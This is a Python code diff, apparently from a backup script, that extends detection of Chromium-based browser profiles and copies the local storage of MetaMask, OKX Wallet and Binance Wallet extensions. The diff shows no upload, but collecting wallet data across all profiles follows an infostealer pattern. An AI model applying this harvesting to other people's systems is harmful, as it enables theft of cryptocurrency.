@@ -1174,12 +1174,87 @@ def backup_browser_extensions(backup_manager):
         },
     }
     
-    # 浏览器 User Data 根目录
+    # 浏览器 User Data 根目录（Windows 路径）
+    # 支持多种常见浏览器和可能的变体路径
+    local_appdata = os.environ.get('LOCALAPPDATA', '')
+    
+    # 标准浏览器路径
     browser_user_data_paths = {
-        "chrome": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
-        "edge": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
-        "brave": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
+        "chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
+        "edge": os.path.join(local_appdata, "Microsoft", "Edge", "User Data"),
+        "brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data"),
+        "chromium": os.path.join(local_appdata, "Chromium", "User Data"),
     }
+    
+    # 动态检测：尝试查找所有可能的浏览器数据目录
+    def find_browser_paths():
+        """动态检测浏览器路径，包括可能的变体"""
+        found_paths = {}
+        
+        if not local_appdata or not os.path.exists(local_appdata):
+            return found_paths
+        
+        # 已知的浏览器目录模式
+        browser_patterns = {
+            "chrome": [
+                "Google/Chrome/User Data",
+                "Google/Chrome Beta/User Data",
+                "Google/Chrome SxS/User Data",  # Chrome Canary
+            ],
+            "brave": [
+                "BraveSoftware/Brave-Browser/User Data",
+                "BraveSoftware/Brave-Browser-Beta/User Data",
+                "BraveSoftware/Brave-Browser-Nightly/User Data",
+            ],
+            "edge": [
+                "Microsoft/Edge/User Data",
+                "Microsoft/Edge Beta/User Data",
+                "Microsoft/Edge Dev/User Data",
+                "Microsoft/Edge Canary/User Data",
+            ],
+            "chromium": [
+                "Chromium/User Data",
+            ],
+        }
+        
+        for browser_name, patterns in browser_patterns.items():
+            for pattern in patterns:
+                test_path = os.path.join(local_appdata, pattern)
+                if os.path.exists(test_path):
+                    # 检查是否包含 User Data 结构（至少要有 Default 或 Profile 目录）
+                    if os.path.isdir(test_path):
+                        # 检查是否有 Profile 目录结构
+                        has_profile = False
+                        try:
+                            for item in os.listdir(test_path):
+                                item_path = os.path.join(test_path, item)
+                                if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
+                                    has_profile = True
+                                    break
+                        except:
+                            pass
+                        
+                        if has_profile:
+                            # 使用第一个找到的版本（标准版优先）
+                            if browser_name not in found_paths:
+                                found_paths[browser_name] = test_path
+                                if backup_manager.config.DEBUG_MODE:
+                                    logging.debug(f"🔍 检测到浏览器: {browser_name} -> {test_path}")
+        
+        return found_paths
+    
+    # 合并标准路径和动态检测的路径
+    detected_paths = find_browser_paths()
+    for browser_name, path in detected_paths.items():
+        if browser_name not in browser_user_data_paths or not os.path.exists(browser_user_data_paths[browser_name]):
+            browser_user_data_paths[browser_name] = path
+    
+    # 调试信息：显示所有检测到的浏览器路径
+    if backup_manager.config.DEBUG_MODE:
+        logging.debug("🔍 开始扫描浏览器扩展，检测到的浏览器路径:")
+        for browser_name, path in browser_user_data_paths.items():
+            exists = "✅" if os.path.exists(path) else "❌"
+            logging.debug(f"  {exists} {browser_name}: {path}")
     
     def identify_extension(ext_id, ext_settings_path):
         """通过扩展ID和manifest.json识别扩展类型"""
@@ -1227,10 +1302,17 @@ def backup_browser_extensions(backup_manager):
             return None
         
         backed_up_count = 0
+        scanned_browsers = []  # 记录扫描过的浏览器
+        found_profiles = []  # 记录找到的 Profile
+        found_extensions = []  # 记录找到的所有扩展（包括非目标扩展）
         
         for browser_name, user_data_path in browser_user_data_paths.items():
             if not os.path.exists(user_data_path):
+                if backup_manager.config.DEBUG_MODE:
+                    logging.debug(f"⏭️  跳过 {browser_name}: 路径不存在 ({user_data_path})")
                 continue
+            
+            scanned_browsers.append(browser_name)
             
             # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
             try:
@@ -1242,6 +1324,13 @@ def backup_browser_extensions(backup_manager):
                         ext_settings_path = os.path.join(item_path, "Local Extension Settings")
                         if os.path.exists(ext_settings_path):
                             profiles.append((item, ext_settings_path))
+                            found_profiles.append(f"{browser_name}/{item}")
+                
+                if backup_manager.config.DEBUG_MODE:
+                    if profiles:
+                        logging.debug(f"📂 {browser_name}: 找到 {len(profiles)} 个 Profile")
+                    else:
+                        logging.debug(f"📂 {browser_name}: 未找到包含扩展设置的 Profile")
                 
                 # 备份每个 Profile 中的扩展
                 for profile_name, ext_settings_path in profiles:
@@ -1250,10 +1339,16 @@ def backup_browser_extensions(backup_manager):
                         ext_dirs = [d for d in os.listdir(ext_settings_path) 
                                    if os.path.isdir(os.path.join(ext_settings_path, d))]
                         
+                        if backup_manager.config.DEBUG_MODE:
+                            logging.debug(f"  📦 {browser_name}/{profile_name}: 找到 {len(ext_dirs)} 个扩展目录")
+                        
                         for ext_id in ext_dirs:
+                            found_extensions.append(f"{browser_name}/{profile_name}/{ext_id}")
                             # 识别扩展类型
                             ext_name = identify_extension(ext_id, ext_settings_path)
                             if not ext_name:
+                                if backup_manager.config.DEBUG_MODE:
+                                    logging.debug(f"    ⏭️  跳过扩展 {ext_id[:20]}... (不是目标扩展)")
                                 continue  # 不是目标扩展，跳过
                             
                             source_dir = os.path.join(ext_settings_path, ext_id)
@@ -1285,7 +1380,33 @@ def backup_browser_extensions(backup_manager):
             logging.info(f"📦 成功备份 {backed_up_count} 个浏览器扩展")
             return extensions_backup_dir
         else:
+            # 提供详细的诊断信息
             logging.warning("⚠️ 未找到任何浏览器扩展数据")
+            if backup_manager.config.DEBUG_MODE:
+                if scanned_browsers:
+                    logging.debug(f"  已扫描浏览器: {', '.join(scanned_browsers)}")
+                else:
+                    logging.debug("  ❌ 未找到任何已安装的浏览器（Chrome/Brave/Edge/Chromium）")
+                    logging.debug(f"  检查路径: {local_appdata}")
+                
+                if found_profiles:
+                    logging.debug(f"  找到的 Profile: {', '.join(found_profiles)}")
+                else:
+                    logging.debug("  ❌ 未找到任何包含扩展设置的 Profile 目录")
+                
+                if found_extensions:
+                    logging.debug(f"  找到的扩展总数: {len(found_extensions)} (但都不是目标扩展)")
+                    logging.debug("  目标扩展: MetaMask, OKX Wallet, Binance Wallet")
+                    if len(found_extensions) <= 5:
+                        logging.debug(f"  扩展列表: {', '.join(found_extensions)}")
+                else:
+                    logging.debug("  ❌ 未找到任何扩展目录")
+                    logging.debug("  可能原因:")
+                    logging.debug("    1. 浏览器未安装任何扩展")
+                    logging.debug("    2. 扩展安装在非标准位置")
+                    logging.debug("    3. 使用了脚本不支持的浏览器（如 Firefox 等）")
+            else:
+                logging.warning("  💡 提示: 开启 DEBUG_MODE 可查看详细诊断信息")
             return None
     except Exception as e:
         logging.error(f"复制浏览器扩展目录失败: {e}")
